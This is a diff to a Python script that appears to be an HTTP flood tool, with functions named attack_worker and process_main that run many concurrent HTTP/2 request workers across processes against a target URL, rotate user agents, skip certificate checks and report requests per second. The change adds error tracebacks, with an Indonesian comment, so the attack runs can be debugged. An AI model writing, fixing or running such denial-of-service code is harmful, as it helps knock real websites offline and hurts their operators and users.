@@ -2,6 +2,7 @@ import asyncio
 import random
 import time
 import os
+import traceback
 import argparse
 from multiprocessing import Process, cpu_count, Value
 from ctypes import c_ulonglong
@@ -206,6 +207,7 @@ async def attack_worker(url: str, end_time: float, client: AsyncClient, user_age
             await make_request(client, url, user_agents, success_counter)
             await asyncio.sleep(random.uniform(0.001, 0.01))
 
+
 async def process_main(url: str, duration: int, threads: int, concurrency: int, user_agents: list, success_counter):
     pid = os.getpid()
     sem = asyncio.Semaphore(concurrency)
@@ -216,23 +218,26 @@ async def process_main(url: str, duration: int, threads: int, concurrency: int, 
     )
     timeout = Timeout(10.0, connect=5.0)
 
-    try:
-        async with AsyncClient(
-            http2=True,
-            limits=limits,
-            timeout=timeout,
-            verify=False,
-        ) as client:
-            end_time = time.time() + duration
-            tasks = [
-                attack_worker(url, end_time, client, user_agents, sem, success_counter)
-                for _ in range(threads)
-            ]
-            await asyncio.gather(*tasks)
-    except Exception:
+    try:  
+        async with AsyncClient(  
+            http2=True,  
+            limits=limits,  
+            timeout=timeout,  
+            verify=False,  
+        ) as client:  
+            end_time = time.time() + duration  
+            tasks = [  
+                attack_worker(url, end_time, client, user_agents, sem, success_counter)  
+                for _ in range(threads)  
+            ]  
+            await asyncio.gather(*tasks)  
+    except Exception as e:  
+        # TAMPILKAN ERROR AGAR TAHU PENYEBABNYA
+        print(f"[!] Error pada process {os.getpid()}: {e}")
+        traceback.print_exc()
+    finally:  
         pass
-    finally:
-        pass
+
 
 def run_process_wrapper(url, duration, threads, concurrency, user_agents, success_counter):
     try:
@@ -327,4 +332,3 @@ if __name__ == "__main__":
         print(f"[*] Total Requests: {total_requests:,}")
         print(f"[*] Average RPS  : {avg_rps:,.2f}")
         print("-" * 70)
-
